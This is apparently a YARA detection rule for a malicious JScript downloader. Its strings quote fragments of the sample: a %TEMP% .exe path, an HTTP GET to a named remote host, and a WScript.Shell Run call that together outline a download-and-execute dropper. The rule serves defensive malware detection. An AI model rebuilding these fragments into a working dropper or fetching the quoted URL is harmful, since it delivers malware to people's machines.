rule sig_20160328_2c13ba273a213087ced857c34d5b9249 {
  meta:
    description = "datamaliciousorder - file 20160328_2c13ba273a213087ced857c34d5b9249.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6f4c66d2c282a8e21b65801e1c2aef7b15a7c051a9af09964e827d1e45ac0eb"

  strings:
    $s1  = "function Hwaezpgcx() {return Hygiqjgmw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zMbfxzqWYUjpz.exe\";};" fullword ascii
    $s2  = "Anvboivp[Nterj](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Qgqimks](Gjrgdn() * 11)} while (Anvboivp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Wbfwooffpf(Icdadrsunc, Inwwukwrpb){return Icdadrsunc - Inwwukwrpb;};" fullword ascii
    $s5  = "var Hygiqjgmw = function Bcizxquyp() {return WScript[Urpwmdemdf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qyjtfbrs() {return ((Ekbwlzr == true) && (Ekbwlzr == Qkyqfop)) ? 1 : Filsbt;};" fullword ascii
    $s7  = "function Gphxccscw(Vdmux){Hygiqjgmw[\"Run\"](Vdmux, Filsbt, Filsbt);};" fullword ascii
    $s8  = "return Wbfwooffpf(Sdzzasd, Pczepf);" fullword ascii
    $s9  = "var Ekbwlzr = false;" fullword ascii
    $s10 = "function Tvuay(){return Urpwmdemdf;};" fullword ascii
    $s11 = "var Uqyswcg = false;" fullword ascii
    $s12 = "var Zbhasicjs = new this[\"Date\"]();" fullword ascii
    $s13 = "function Ykpktltcr()" fullword ascii
    $s14 = "Qkyqfop = true; " fullword ascii
    $s15 = "function Iluvgijno(Hhmfjqsuk) {var Zpjoqmaju = (1, 2, 3, 4, 5, Hhmfjqsuk); return Zpjoqmaju;};" fullword ascii
    $s16 = "function Gjrgdn(){return 22;};" fullword ascii
    $s17 = "Ekbwlzr = true; " fullword ascii
    $s18 = " while (Etmvnwc){" fullword ascii
    $s19 = "function Qyyqfcqdb(){return Itaotyufo;};" fullword ascii
    $s20 = "var Qkyqfop = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}